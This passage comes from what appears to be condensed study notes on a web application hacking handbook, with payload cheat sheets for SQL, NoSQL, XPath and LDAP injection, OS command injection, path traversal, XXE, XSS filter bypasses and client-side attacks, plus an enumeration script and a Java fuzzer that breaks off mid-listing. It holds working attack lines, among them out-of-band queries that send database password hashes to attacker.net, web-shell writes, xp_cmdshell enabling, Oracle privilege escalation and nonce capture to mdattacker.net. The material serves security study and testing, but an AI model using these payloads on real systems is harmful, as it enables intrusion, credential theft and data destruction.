  5. **Static Files:** Direct URLs to downloadable reports or PDFs (`/download/9780636628104.pdf`) hosted inside the web root where static file requests bypass application-layer checks.
  6. **Platform Misconfiguration (HTTP Verb Tampering):** Platform security rules restricting `POST` and `GET` on `/admin/*` to the `Admin` role, while leaving `HEAD` or arbitrary invalid HTTP verbs unrestricted (which the platform passes to the `GET` handler!).
  7. **Insecure Access Control Methods:** Relying on client-submitted parameters (`?admin=true`), `Referer` headers, or IP geolocation.
* **Multilayered Privilege Model (Defense-in-Depth):** Combine **Programmatic Control** (fine-grained DB matrix), **Discretionary Access Control (DAC)**, **Role-Based Access Control (RBAC)**, and **Declarative Control** (using distinct, least-privilege database accounts for different user roles).

### Ubuntu 24.04 Access Control Testing Commands
```bash
# Test HTTP Verb Tampering (bypassing POST/GET platform restrictions using HEAD or custom verbs)
curl -k -i -X HEAD "https://target.com/admin/createUser?username=hacker&role=admin" \
  -H "Cookie: SessionId=LOW_PRIV_USER_TOKEN"

# Test Referer-based access control bypass
curl -k -i "https://target.com/auth/472/CreateUser.ashx" \
  -H "Referer: https://target.com/auth/472/Admin.ashx" \
  -H "Cookie: SessionId=LOW_PRIV_USER_TOKEN"
```

---

<a id="part-iv--attacking-data-stores--back-end-components"></a>

**PART IV — ATTACKING DATA STORES & BACK-END COMPONENTS**
*Chapters 9–10 — SQL/NoSQL/XPath/LDAP injection and back-end interpreter attacks (OS commands, XXE, SSRF, SMTP).*

---

## Chapter 9: Attacking Data Stores (SQL, NoSQL, XPath, LDAP)

### Core Summary & Complete Payload Reference

#### 1. SQL Injection (SQLi)
* **Bypassing a Login:**
  * Known username: `admin'--` (or `admin'#` / `admin'-- ` in MySQL)
  * Unknown username (logs in as first user in table, usually admin): `' OR 1=1--` or `' OR 'a'='a`
* **Injecting into Different Statement Types:**
  * `SELECT`: Usually in `WHERE`, `ORDER BY`, or `HAVING` clauses.
  * `INSERT`: Must complete the `VALUES` tuple with the right number of fields or comment out the rest: `foo', 'bar', 9999, 0)--` (test field count iteratively with `foo')--`, `foo', 1)--`, `foo', 1, 1)--`; use `2000` if date fields reject `1`).
  * `UPDATE` & `DELETE`: **Warning!** Never inject `' OR 1=1--` into an `UPDATE` or `DELETE` `WHERE` clause without a specific target condition, or you will overwrite/delete every row in the database! Use `admin'--` instead.
* **Finding SQLi Bugs:**
  * *String Data:* Test single quote `'` (causes error) vs two single quotes `''` (error disappears). Test string concatenation equivalent to `FOO`:
    * **Oracle:** `'||'FOO`
    * **MS-SQL:** `'+'FOO`
    * **MySQL:** `' 'FOO`
  * *Numeric Data:* Test math equivalents for `2`: `1+1`, `67-ASCII('A')`, or quoteless `51-ASCII(1)`. (Remember to URL-encode `+` as `%2b`!).
  * *Query Structure (`ORDER BY` / Column Names):* Prepared statements cannot parameterize column/table names or `ASC`/`DESC`. Test `1 ASC--` vs `1 DESC--`, or inject a nested subquery: `(select 1 where <<condition>> or 1/0=0)`.
* **Fingerprinting the Database (Evaluates to `0` on target DB, errors on others):**
  * **Oracle:** `BITAND(1,1)-BITAND(1,1)`
  * **MS-SQL:** `@@PACK_RECEIVED-@@PACK_RECEIVED`
  * **MySQL:** `CONNECTION_ID()-CONNECTION_ID()` or version comment `/*!32302 and 1=0*/`
* **The `UNION` Operator:**
  * Step 1: Find column count using `ORDER BY 1--`, `ORDER BY 2--` or `' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--` (In Oracle, always append `FROM DUAL`).
  * Step 2: Find string-compatible column: `' UNION SELECT 'a',NULL,NULL--`.
  * Step 3: Extract database metadata and user tables.
* **Bypassing Filters:**
  * *Blocked Quotes:* Construct strings from ASCII codes:
    * **Oracle:** `CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)`
    * **MS-SQL:** `CHAR(109)+CHAR(97)+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)`
  * *Blocked Spaces:* Use C-style inline comments: `SELECT/*foo*/username,password/*foo*/FROM/*foo*/users`. In MySQL, comments can even split keywords: `SEL/*foo*/ECT`.
  * *Simple Blacklists:* Case variation `SeLeCt`, null byte `%00SELECT`, non-recursive stripping `SELSELECTECT`, hex URL encoding `%53%45%4c%45%43%54`.
  * *Second-Order SQLi:* Input is safely escaped with doubled quotes (`''`) during `INSERT` (e.g., registering username `' or 1 in (select password from users where username='admin')--`), stored as literal text in the DB, and later read from the DB and concatenated unsafely into a second query (e.g., during password change).
* **Advanced / Blind SQLi Exploitation:**
  * *Error-Based Extraction (MS-SQL):* Force a `varchar` to `int` conversion error: `' and 1 in (select password from users where username='admin')--`
  * *Out-of-Band (OOB) Channels:*
    * **MS-SQL:** `insert into openrowset('SQLOLEDB','DRIVER={SQL Server};SERVER=attacker.net,80;UID=sa;PWD=letmein','select * from foo') values (@@version)`
    * **Oracle HTTP:** `'||UTL_HTTP.request('http://attacker.net:80/'||(SELECT username FROM all_users WHERE ROWNUM=1))--`
    * **Oracle DNS:** `'||UTL_INADDR.GET_HOST_NAME((SELECT PASSWORD FROM DBA_USERS WHERE NAME='SYS')||'.attacker.net')--`
    * **Oracle 11g (bypassing ACLs):** `SYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE NAME='SYS')||'.attacker.net',80)`
    * **MySQL SMB Share:** `select * into outfile '\\\\attacker.net\\share\\output.txt' from users;`
  * *Inference via Conditional Responses & Conditional Errors:*
    * Character-by-character extraction: `admin' AND ASCII(SUBSTRING('Admin',1,1)) = 65--`
    * Conditional divide-by-zero error (Oracle): `SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP'`
  * *Time Delays:*
    * **MS-SQL (Bit-by-bit extraction):** `if (ASCII(SUBSTRING('Admin',1,1)) & (POWER(2,0))) > 0 waitfor delay '0:0:5'`
    * **MySQL (≥ 5.0.12):** `select if(user() like 'root@%', sleep(5), 'false')`
    * **MySQL (< 5.0.12):** `select if(user() like 'root@%', benchmark(50000,sha1('test')), 'false')`
    * **PostgreSQL:** `PG_SLEEP(5)`
    * **Oracle:** `SELECT 'a'||Utl_Http.request('http://madeupserver.com') FROM dual WHERE ...`
* **Escalating the Database Attack:**
  * **MS-SQL Re-enabling `xp_cmdshell` (SQL Server 2005+):**
    ```sql
    EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE;
    EXECUTE sp_configure 'xp_cmdshell', '1'; RECONFIGURE WITH OVERRIDE;
    EXEC master..xp_cmdshell 'ipconfig > C:\inetpub\wwwroot\foo.txt';
    ```
  * **Oracle Privilege Escalation & OS Command Execution:**
    ```sql
    -- Exploit DBMS_EXPORT_EXTENSION (pre-July 2006 CPU)
    select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDX','SCH','TEXTINDEXMETHODS".ODCIIndexUtilCleanup(:p1); execute immediate ''declare pragma autonomous_transaction; begin execute immediate ''''grant dba to public'''' ; end;''; END;--','CTXSYS',1,'1',0) from dual;

    -- Execute OS commands in Oracle 10g R2 / 11g via Java Wrapper
    DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c dir>c:\\OUT.LST')
    ```
  * **MySQL File Read/Write:** `select load_file('/etc/passwd')` and `select * from test into outfile '/var/www/html/shell.php'`.

#### Complete Cross-DBMS SQL Syntax Cheat Sheet (Chapter 9)

| Requirement | Oracle | MS-SQL | MySQL |
| :--- | :--- | :--- | :--- |
| **ASCII & Substring** | `ASCII('A')`, `SUBSTR('ABCDE',2,3)` | `ASCII('A')`, `SUBSTRING('ABCDE',2,3)` | `ASCII('A')`, `SUBSTRING('ABCDE',2,3)` |
| **Current DB User** | `SELECT user FROM dual` or `SYS_CONTEXT('USERENV','SESSION_USER')` | `select suser_sname()` | `SELECT user()` |
| **Time Delay** | `Utl_Http.request('http://madeupserver.com')` | `waitfor delay '0:0:10'` | `sleep(10)` |
| **DB Version** | `select banner from v$version` | `select @@version` | `select @@version` |
| **Current Database** | `SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual` | `SELECT db_name()`, `SELECT @@servername` | `SELECT database()` |
| **Current User Privs** | `SELECT privilege FROM session_privs` | `SELECT grantee, table_name, privilege_type FROM INFORMATION_SCHEMA.TABLE_PRIVILEGES` | `SELECT * FROM information_schema.user_privileges WHERE grantee = '[user]'` |
| **All Tables & Columns (Single String)** | `Select table_name||':'||column_name from all_tab_columns` | `SELECT table_name+':'+column_name from information_schema.columns` | `SELECT CONCAT(table_name,':',column_name) from information_schema.columns` |
| **Show User Tables** | `SELECT object_name FROM user_objects WHERE object_type='TABLE'` | `SELECT name FROM sysobjects WHERE xtype='U'` | `SELECT table_name FROM information_schema.tables where table_type='BASE TABLE'` |
| **Columns for Table `FOO`** | `SELECT column_name FROM user_tab_columns WHERE table_name = 'FOO'` | `SELECT column_name FROM information_schema.columns WHERE table_name='foo'` | `SELECT column_name FROM information_schema.columns WHERE table_name='foo'` |

#### 2. NoSQL Injection (MongoDB)
When user input is concatenated into a MongoDB `$where` JavaScript function (`function() { return this.username == '$username' & this.password == '$password'; }`):
```javascript
// Bypass authentication using single-line JS comment:
Marcus'//

// Bypass authentication without comments:
a' || 1==1 || 'a'=='a
```

#### 3. XPath Injection
* **Logic Bypass:** `' or 'a'='a`
* **Detection Test Strings:**
  ```xpath
  ' or count(parent::*[position()=1])=0 or 'a'='b
  ' or count(parent::*[position()=1])>0 or 'a'='b
  ```
* **Blind Extraction of Parent Node Name & All Child Nodes (1 byte at a time):**
  ```xpath
  ' or substring(name(parent::*[position()=1]),1,1)='a
  ' or substring(//address[position()=1]/child::node()[position()=6]/text(),1,1)='M' and 'a'='a
  ```

#### 4. LDAP Injection
* **Disjunctive Query Bypass (`(|(department=London $input)(department=Reading $input))`):**
  ```ldap
  )(department=*
  ```
* **Conjunctive Query Bypass (OpenLDAP multiple filter batching):**
  ```ldap
  *))(&(givenName=daf
  ```
* **Conjunctive Query Bypass (NULL byte string termination):**
  ```ldap
  *))%00
  ```

### Ubuntu 24.04 SQLMap Commands (from Chapter 9)
```bash
# Run sqlmap on Ubuntu 24.04 to confirm UNION SQLi and drop into an interactive SQL shell
sqlmap -u "http://wahh-app.com/employees.asp?Empno=7369" -p Empno --union-use --sql-shell

# Set up a Netcat listener on Ubuntu 24.04 to catch Oracle UTL_HTTP out-of-band data
sudo nc -nlvp 80
```

---

## Chapter 10: Attacking Back-End Components

### Core Summary & Payloads
1. **OS Command Injection & Dynamic Execution:**
   * Occurs when user input is passed to shell interpreters (`exec`, `system`, `passthru`, `popen`, backticks `` ` ``, `wscript.shell`, `cmd /c`).
   * **All-Purpose Time-Delay Detection String (Windows & Linux/UNIX):**
     ```text
     || ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
     ```
   * **Individual Metacharacter Test Payloads:**
     ```text
     | ping -i 30 127.0.0.1 |
     | ping -n 30 127.0.0.1 |
     & ping -i 30 127.0.0.1 &
     & ping -n 30 127.0.0.1 &
     ; ping 127.0.0.1 ;
     %0a ping -i 30 127.0.0.1 %0a
     ` ping 127.0.0.1 `
     ```
   * **Output Redirection & Argument Injection Tricks:**
     * Redirect command output to web root: `dir > c:\inetpub\wwwroot\foo.txt`
     * Abuse `nslookup` NXDOMAIN error to write a PHP/ASP shell when `|`, `;`, `&` are blocked: `nslookup "<?php system($_GET['c']); ?>" > /var/www/html/shell.php`
     * Inject command-line flags (e.g., into `wget`): `url=http://attacker.com/shell.asp%20-O%20c:\inetpub\wwwroot\scripts\cmdasp.asp`
     * Bypass space filters on UNIX using `$IFS`: `;cat$IFS/etc/passwd;`
   * **Dynamic Script Execution (`eval()` in PHP/Perl, `Execute()` in ASP):**
     * Test strings: `;echo%20111111`, `response.write%20111111`, `:response.write%20111111`, `phpinfo()`
     * Exploit payloads: `;$mysearch=wahh; echo file_get_contents('/etc/passwd')` or `system('cat /etc/passwd')`
2. **Manipulating File Paths (Path Traversal & File Inclusion):**
   * **Non-Invasive Traversal Detection:** Compare `file=foo/file1.txt` vs. `file=foo/bar/../file1.txt`.
   * **Read Traversal Payloads:** `../../../../../../../../../../../../etc/passwd` and `..\..\..\..\..\..\..\..\..\..\windows\win.ini`.
   * **Write Traversal Differential Detection:**
     * Windows: Compare `../../../../../../../../writetest.txt` (succeeds) vs. `../../../../../../../../windows/system32/config/sam` (locked by OS, fails).
     * Linux/UNIX: Compare `../../../../../../../../tmp/writetest.txt` (succeeds) vs. `../../../../../../../../tmp` (cannot overwrite directory with file, fails).
   * **Traversal Filter Bypasses:**
     * URL encoding: `%2e`, `%2f` (`/`), `%5c` (`\`)
     * 16-bit Unicode encoding: `%u002e`, `%u2215`, `%u2216`
     * Double URL encoding: `%252e`, `%252f`, `%255c`
     * Overlong UTF-8 encoding: `%c0%2e`, `%e0%40%ae`, `%c0%af`, `%e0%80%af`, `%c0%5c`
     * Non-recursive stripping bypasses: `....//`, `....\/`, `..../\`, `....\\`
     * File extension filter bypass (NULL byte): `../../../../../boot.ini%00.jpg`
     * Prefix directory filter bypass: `filestore/../../../../../../../etc/passwd`
   * **Remote & Local File Inclusion (RFI/LFI):**
     * RFI: `https://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor`
3. **Injecting into XML Interpreters (XXE & SOAP):**
   * **XML External Entity (XXE) File Read:**
     ```xml
     <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
     <Search><SearchTerm>&xxe;</SearchTerm></Search>
     ```
   * **XXE Internal Port Scanning / SSRF & DoS:**
     ```xml
     <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1:25" > ]>
     <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///dev/random" > ]>
     ```
   * **SOAP Injection:**
     * Detection: Compare `</foo>` (causes error) vs. `<foo></foo>` (no error), or compare `test<foo/>` vs. `test<foo></foo>`.
     * Exploitation: `1430</Amount><ClearedFunds>True</ClearedFunds><Amount>1430` or comment out tags across parameters using `<!--` and `-->`.
4. **Injecting into Back-End HTTP Requests (SSRF, HPI, HPP):**
   * **Server-Side HTTP Redirection (SSRF):** Point URL parameters (`loc=192.168.0.1:22` or `127.0.0.1:8080`) to internal services to grab banners or port-scan.
   * **HTTP Parameter Injection (HPI) & Pollution (HPP):** Append URL-encoded parameters (`%26clearedfunds%3dtrue`) to an existing parameter so the front-end server URL-decodes it and passes `&clearedfunds=true` into the back-end HTTP request or `mod_rewrite` rule.
5. **Injecting into Mail Services (SMTP Injection):**
   * **Header Injection:** `<youremail>%0aCc:<youremail>`, `<youremail>%0d%0aBcc:<youremail>`
   * **Full SMTP Command Injection:**
     ```text
     %0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
     ```

---

<a id="part-v--attacking-application-logic--users"></a>

**PART V — ATTACKING APPLICATION LOGIC & USERS**
*Chapters 11–13 — business-logic flaws, XSS, and client-side/user-targeted attack techniques.*

---

## Chapter 11: Attacking Application Logic

### Core Summary: The 12 Real-World Logic Flaw Archetypes
1. **Asking the Encryption Oracle:** An application uses the same Triple-DES key to encrypt both the `RememberMe` authentication cookie (`username|uid|ip_rand`) and a user-customizable `ScreenName` cookie displayed on-screen.
   * *Oracle Reveal:* Copy `RememberMe` into `ScreenName` to read the decrypted structure on-screen (`Welcome, marcus|734|192.168.4.282750184`).
   * *Oracle Encrypt:* Set your screen name to `admin|1|192.168.4.282750184`, copy the resulting encrypted `ScreenName` cookie into `RememberMe`, and log in as the administrator!
2. **Fooling a Password Change Function:** User and Admin password change forms share the same back-end script. If `existingPassword` is `null` (omitted from the request entirely, not just empty `""`), the script assumes an administrator made the request and changes any user's password without verification.
3. **Proceeding to Checkout (Forced Browsing):** Skipping Stage 3 (Enter payment info) and browsing directly from Stage 2 (Finalize order) to Stage 4 (Delivery info) orders goods without paying.
4. **Rolling Your Own Insurance (Out-of-Sequence Parameter Submission):** A shared parameter-parsing component updates session state with *any* parameter submitted at *any* stage. Submitting Stage 1 parameters (`premium` or `value`) at Stage 4 bypasses Stage 1 validation; guessing and submitting underwriter parameters (`accepted=true`) self-approves the policy.
5. **Breaking the Bank (Session State Object Reuse):** Both the authenticated banking portal and the unauthenticated "Register for Online Access" form store a `CCustomer` object in the user's session. Logging into your own account and then submitting another customer's name/DOB to step 1 of the registration form overwrites `CCustomer` in your authenticated session, giving you full access to the victim's bank account!
6. **Beating a Business Limit:** A check `if (amount <= 10000)` prevents unauthorized transfers over $10,000. Submitting a transfer of `-20000` from Account B to Account A passes `amount <= 10000` and transfers $20,000 from Account A to Account B!
7. **Cheating on Bulk Discounts:** Adding a bundle of items to a cart applies a 25% discount to each item in the cart, but removing unwanted items afterward fails to recalculate and remove the discount.
8. **Escaping from Escaping:** A filter escapes `;|&<>` with `\` but forgets to escape `\` itself. Submitting `foo\;ls` becomes `foo\\;ls` (an escaped literal backslash followed by an unescaped command separator `;`).
9. **Invalidating Input Validation:** A filter doubles single quotes (`'` → `''`) and then truncates input to 128 characters. Submitting 127 `a`s followed by `'` becomes 127 `a`s + `''`, which is truncated to 128 chars (`aaa...a'`), leaving an unescaped single quote that breaks out of the SQL string!
10. **Abusing a Search Function:** Using boolean keyword searches and hit counts on a subscription paywall search engine to infer the contents of confidential press releases or brute-force passwords in a wiki (`Password=A`, `Password=B`, etc.).
11. **Snarfing Debug Messages:** Verbose error reports are stored in a static (non-session) variable and displayed at `/error.jsp`. Continuously polling `/error.jsp` harvests other users' usernames, session tokens, and passwords whenever they encounter an error.
12. **Racing Against the Login:** A race condition in a static variable storing the newly authenticated user's ID briefly during login causes two simultaneous logins to swap sessions.

---

## Chapter 12: Attacking Users: Cross-Site Scripting (XSS)

### Core Summary & Complete XSS Filter Bypass Cheat Sheet
* **Three Varieties of XSS:**
  1. **Reflected (First-Order) XSS:** Malicious input in a request is immediately echoed unsanitized in the response.
  2. **Stored (Second-Order) XSS:** Malicious input is saved in the application (DB, message board, logs, uploaded files) and rendered later to other users.
  3. **DOM-Based XSS:** Client-side JavaScript reads attacker-controllable data from a DOM **source** (`document.location`, `document.URL`, `document.URLUnencoded`, `document.referrer`, `window.location`) and passes it unsafely to a DOM **sink** (`document.write()`, `document.writeln()`, `document.body.innerHtml`, `eval()`, `window.execScript()`, `window.setInterval()`, `window.setTimeout()`).

#### 1. Ways of Introducing Script Code
```html
<!-- Standard & Object Data URI Script Tags (Base64 is <script>alert(1)</script>) -->
<script>alert(1)</script>
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>

<!-- Auto-Triggering Event Handlers & HTML5 Vectors -->
<xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
<object onerror=alert(1)>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<bgsound onpropertychange=alert(1)>
<body onbeforeactivate=alert(1)>
<body onfocusin=alert(1)>
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
</a onmousemove=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>

<!-- Script Pseudo-Protocols & HTML5 Hyphenated Tags -->
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>

<!-- Dynamically Evaluated CSS Styles -->
<x style=x:expression(alert(1))>
<x style=behavior:url(#default#time2) onbegin=alert(1)>
```

#### 2. Bypassing HTML & Script Filters
```html
<!-- NULL Bytes (IE), Arbitrary Tags, and Base Tag Hijacking -->
<[%00]img onerror=alert(1) src=a>
<img o[%00]nerror=alert(1) src=a>
<x onclick=alert(1) src=a>Click here</x>
<base href="http://mdattacker.net/badscripts/">

<!-- Whitespace Alternatives & Quote/Backtick Delimiters -->
<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/"onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
<img src=`a`onerror=alert(1)>
<img/onerror="alert(1)"src=a>

<!-- HTML Entity Encoding Inside Attributes (Decimal, Hex, Zero-Padded, No Semicolon) -->
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>

<!-- Malformed Tag Brackets & E4X -->
<<script>alert(1);//<</script>
<script<{alert(1)}/></script>

<!-- Alternate Character Sets (UTF-7) -->
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-

<!-- JavaScript Escaping, String Construction & Dot/Eval Alternatives -->
<script>a\u006cert(1);</script>
<script>eval('a\u006cert(1)');</script>
<script>eval('a\x6cert(1)');</script>
<script>eval('a\154ert(1)');</script>
<script>eval('a\l\ert\(1\)');</script>
<script>eval(String.fromCharCode(97,108,116,40,49,41));</script>
<script>eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));</script>
<script>'alert(1)'.replace(/.+/,eval)</script>
<script>function::['alert'](1)</script>
<script>alert(document['cookie'])</script>
<script>with(document)alert(cookie)</script>

<!-- Combining HTML Encoding and JS Unicode Escaping in Event Handlers -->
<img onerror=eval('al&#x5c;u0065rt(1)') src=a>

<!-- VBScript & Encoded Scripts (Case-Insensitive Bypass) -->
<IMG ONERROR="VBS:EXECSCRIPT LCASE('ALERT(1)')" SRC=A>
<img onerror="VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@" src=a>
```

#### 3. Beating Length Limits & Delivering Nonstandard XSS
* **Short Payloads:** `open("//a/"+document.cookie)` (28 bytes), `<script src=http://a></script>` (30 bytes).
* **Spanning Multiple Parameters:** `?page_id="><script>/*&seed=*/alert(document.cookie);/*&mode=*/</script>`
* **Converting Reflected XSS to DOM XSS (Payload in URL Fragment `#`):**
  * `<script>eval(location.hash.slice(1))</script>#alert('long script...')`
  * `<script>eval(unescape(location))</script>#%0Aalert('long script...')`
* **Sending Arbitrary XML Cross-Domain via `text/plain` Form & Executing XHTML Namespace:**
  ```html
  <!-- Cross-domain form sending raw XML -->
  <form enctype="text/plain" action="http://wahh-app.com/vuln.php" method="POST">
    <input type="hidden" name='<?xml version' value='"1.0"?><data><param><a xmlns:a="http://www.w3.org/1999/xhtml"><a:body onload="alert(1)"/></a></param></data>'>
  </form>
  <script>document.forms[0].submit();</script>
  ```

### Ubuntu 24.04 Command for Testing Stored XSS in Webmail
```bash
# Send raw custom MIME/HTML emails directly using sendmail on Ubuntu 24.04
cat << 'EOF' > xss_email.txt
MIME-Version: 1.0
From: attacker@example.org
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: 7bit
Subject: XSS Test

<html>
<body>
<img src=``onerror=alert(1)>
</body>
</html>
EOF

sendmail -t victim@target.com < xss_email.txt
```

---

## Chapter 13: Attacking Users: Other Techniques

### Core Summary & Exploit Techniques
1. **Inducing User Actions:**
   * **On-Site Request Forgery (OSRF):** Injecting relative URLs into `<img>` tags on message boards when `<` and `>` are HTML-encoded: `type=../admin/newUser.php?username=daf2&password=0wned&role=admin#`.
   * **Cross-Site Request Forgery (CSRF):** Exploits browsers automatically sending cookies on cross-domain requests.
     * *Brute-Forcing Anti-CSRF Tokens via CSS History Stealing:* If anti-CSRF tokens appear in URLs and persist across requests, dynamically create links with guessed tokens and check `getComputedStyle` for visited link color.
     * *Defeating Anti-CSRF via Login CSRF + Self-XSS:* Force the victim via Login CSRF to log into the *attacker's* account, trigger a self-XSS stored in the attacker's profile, and use the injected script to log out and capture the victim's real credentials when they log back in.
   * **UI Redress (Clickjacking / Strokejacking):** Framing the target app in a transparent `iframe` (`opacity: 0`) overlaid on an enticing decoy button.
     * *Bypassing Framebusting (`if (top.location != self.location)`):*
       1. Redefine `location` in top frame (IE): `var location = 'foo';`
       2. Hook `window.onbeforeunload` and redirect to an `HTTP 204 No Content` page to cancel navigation.
       3. Use HTML5 `<iframe sandbox="allow-forms">...</iframe>` (disables scripts in child frame while keeping cookies/forms active).
       4. Pass part of the framebusting script in a URL parameter so the IE8 XSS filter disables the framebuster!
     * *Remediation:* `X-Frame-Options: deny` or `sameorigin`.
2. **Capturing Data Cross-Domain:**
   * **By Injecting HTML:** Inject an unclosed `<img src='http://mdattacker.net/capture?html=` before a form containing a `nonce`. Everything up to the next single quote in the HTML page is sent to the attacker's server as the image URL! Or inject `<form action="http://mdattacker.net/capture" method="POST">` before the legitimate `<form>` tag.
   * **By Injecting Plain Text (CSS Injection):** Inject `{}`*`{font-family:'` into plain text (e.g., an e-mail subject). Then load the target inbox page cross-domain as a stylesheet (`<link rel="stylesheet" href="https://wahh-mail.com/inbox" type="text/css">`) and read `document.body.currentStyle.fontFamily` via JS!
   * **JavaScript Hijacking:** Including dynamic scripts cross-domain (`<script src="https://target/YourDetailsJson.ashx"></script>`) and overriding callback functions (`function showUserInfo(x)`), overriding the `Array` constructor setter in legacy Firefox, or reading global variables. Prevent with `for(;;);` prefix and `POST`-only requests.
3. **The Same-Origin Policy Revisited:**
   * **Flash (`/crossdomain.xml`) & Silverlight (`/clientaccesspolicy.xml`):** If `<allow-access-from domain="*" />` is present, any third-party site can make two-way authenticated requests and read responses!
   * **HTML5 CORS:** Check if sending `Origin: http://attacker.com` returns `Access-Control-Allow-Origin: *` or `http://attacker.com`.
4. **Other Client-Side Injection Attacks:**
   * **HTTP Header Injection & Response Splitting:** Injecting `%0d%0a` into a header (like `Set-Cookie` or `Location`) to set arbitrary cookies or split the response into two HTTP responses, poisoning an upstream proxy cache for `/admin/`.
   * **Cookie Injection & Session Fixation:** Fixing a known session token in a victim's browser via URL token, header injection, subdomain XSS, or active MITM over HTTP, waiting for the victim to log in, and hijacking the session.
   * **Open Redirection Bypasses:** `HtTp://`, `%00http://`, ` http://`, `//mdattacker.net`, `http:\\mdattacker.net`, `http://mdsec.net.mdattacker.net`, `http://mdattacker.net/?http://mdsec.net`.
   * **Client-Side SQL Injection (HTML5 WebSQL `openDatabase`) & Client-Side HPP (`start=1%26action=delete`).**
5. **Local Privacy Attacks:** Persistent cookies, uncached HTTPS/HTTP pages missing `Cache-Control: no-cache`, URL parameters in history, `autocomplete` not set to `off`, Flash LSOs, Silverlight Isolated Storage, IE `userData`, HTML5 `localStorage`.
6. **Attacking ActiveX Controls:** Inspect controls marked "safe for scripting" (`7DD95801-9882-11CF-9FA9-00AA006C42C4`) for dangerous methods (`LaunchExe`, `SaveFile`) or buffer overflows using COMRaider.
7. **Attacking the Browser:** JS keyloggers (`document.onkeypress`), reverse strokejacking from child ad frames, CSS history stealing, login enumeration via `<script src="..." onerror="...">`, internal port scanning, inter-protocol exploitation, DNS rebinding, BeEF/XSS Shell, and active MITM attacks (injecting into background HTTP requests to poison cookies or HTTP script includes).

---

<a id="part-vi--automation-information-disclosure--native-apps"></a>

**PART VI — AUTOMATION, INFORMATION DISCLOSURE & NATIVE APPS**
*Chapters 14–16 — building custom attack tooling, mining information leaks, and native-binary memory corruption.*

---

## Chapter 14: Automating Customized Attacks

### Core Summary
Customized automation is used for three primary tasks:
1. **Enumerating Valid Identifiers** (e.g., page IDs, usernames, session tokens).
2. **Harvesting Useful Data** (e.g., extracting names, usernames, and passwords via an IDOR flaw).
3. **Fuzzing for Common Vulnerabilities** (sending fuzz strings to every parameter and grepping responses).
* **Detecting Hits:** Monitor HTTP Status Code, Response Length, Response Body strings, `Location` header, `Set-Cookie` header, and Time Delays.
* **Barriers to Automation & Bypasses:**
  * *Session-Handling Mechanisms:* Use Burp Suite's Cookie Jar, Request Macros (automatically fetching fresh CSRF tokens or logging back in when a session is terminated), and Session-Handling Rules.
  * *CAPTCHA Controls:* Check if the solution is leaked in the image URL/filename, hidden form fields, or HTML comments; test if a single solved CAPTCHA token can be replayed multiple times if the parameter is omitted or reused; or use OCR (`tesseract` / `gocr` on Ubuntu 24.04).

### Ubuntu 24.04 Scripts from Chapter 14 (Bash, Curl & Complete `JAttack.java`)

#### 1. Bash & Netcat Identifier Enumeration Script (Ubuntu 24.04)
```bash
#!/bin/bash
# Save as enum_ids.sh and run: ./enum_ids.sh < IDs.txt
server="mdsec.net"
port=80
while read id
do
  echo -ne "$id\t"
  echo -ne "GET /app/ShowPage.ashx?PageNo=$id HTTP/1.0\r\nHost: $server\r\n\r\n" \
    | nc -w 3 $server $port | head -n 1
done | tee outputfile.txt
```

#### 2. Complete `JAttack.java` Fuzzer & Data Harvester (Ready to Compile on Ubuntu 24.04)
```java
// File: JAttack.java
// Complete implementation from Chapter 14 combining Enumeration, Data Harvesting, and Fuzzing
import java.net.*;
import java.io.*;

class Param {
    String name, value;
    Type type;
    boolean attack;

    Param(String name, String value, Type type, boolean attack) {
        this.name = name;
        this.value = value;
        this.type = type;
        this.attack = attack;
    }

    enum Type { URL, COOKIE, BODY }
}

interface PayloadSource {
    boolean nextPayload();
    void reset();
    String getPayload();
}

class PSNumbers implements PayloadSource {
    int from, to, step, current;

    PSNumbers(int from, int to, int step) {
        this.from = from;
        this.to = to;
        this.step = step;
        reset();
    }

    public boolean nextPayload() {
        current += step;
        return current <= to;
    }

    public void reset() {
        current = from - step;
    }

    public String getPayload() {
        return Integer.toString(current);
    }
}

class PSFuzzStrings implements PayloadSource {
    static final String[] fuzzStrings = new String[] {
